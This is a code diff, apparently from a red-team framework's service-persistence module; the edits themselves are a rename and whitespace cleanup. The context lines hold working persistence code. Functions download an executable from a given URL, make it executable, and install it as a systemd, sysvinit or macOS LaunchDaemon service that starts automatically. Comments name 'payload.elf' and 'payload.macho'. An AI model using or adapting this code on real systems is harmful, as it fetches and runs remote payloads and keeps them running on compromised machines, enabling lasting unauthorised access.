@@ -23,7 +23,7 @@ PIDFile={{ SERVICE_PID_FILE }}
 WantedBy=multi-user.target
 """
 
-sysvinit = """#!/bin/sh
+sysvinit_template = """#!/bin/sh
 ### BEGIN INIT INFO
 # Provides:          {{ SERVICE_NAME }}
 # Required-Start:    $remote_fs $syslog
@@ -156,7 +156,7 @@ def systemd(service_name, service_desc, executable_path, executable_url):
     # assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
     file.write("/tmp/systemd.service.j2", systemd_service_template)
     args = {
-        "SERVICE_NAME":service_name, 
+        "SERVICE_NAME":service_name,
         "SERVICE_DESC":service_desc,
         "SERVICE_START_CMD":executable_path
     }
@@ -166,7 +166,7 @@ def systemd(service_name, service_desc, executable_path, executable_url):
     # assets.copy("persist_service/files/payload.elf", executable_path)
     file.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
-    
+
     sys.shell("systemctl daemon-reload "+service_name)
     sys.shell("systemctl enable "+service_name)
     sys.shell("systemctl start "+service_name)
@@ -175,7 +175,7 @@ def sysvinit(service_name, service_desc, executable_path, executable_url):
     # assets.copy("persist_service/files/sysvinit.sh.j2","/tmp/svc.sh.j2")
     file.write("/tmp/svc.sh.j2", sysvinit_template)
     args = {
-        "SERVICE_NAME":service_name, 
+        "SERVICE_NAME":service_name,
         "SERVICE_DESC":service_desc,
         "SERVICE_START_CMD":executable_path
     }
@@ -186,7 +186,7 @@ def sysvinit(service_name, service_desc, executable_path, executable_url):
     # assets.copy("persist_service/files/payload.elf", executable_path)
     file.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
-    
+
     sys.shell("update-rc.d "+service_name+" defaults")
     sys.shell("service "+service_name+" start")
 
@@ -194,12 +194,12 @@ def launch_daemon(service_name, executable_path, executable_url):
     # assets.copy("persist_service/files/launch_daemon.plist.j2","/tmp/plist.j2")
     file.write("/tmp/plist.j2",launch_daemon_template)
     args = {
-        "service_name":"com.testing."+service_name, 
+        "service_name":"com.testing."+service_name,
         "bin_path":executable_path
     }
     file.template("/tmp/plist.j2","/Library/LaunchDaemons/"+service_name+".plist", args, False)
     file.remove("/tmp/plist.j2")
-    
+
     # assets.copy("persist_service/files/payload.macho", executable_path)
     file.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
@@ -224,4 +224,3 @@ persist_service(
     input_params['executable_name'],
     input_params['executable_url']
 )
-
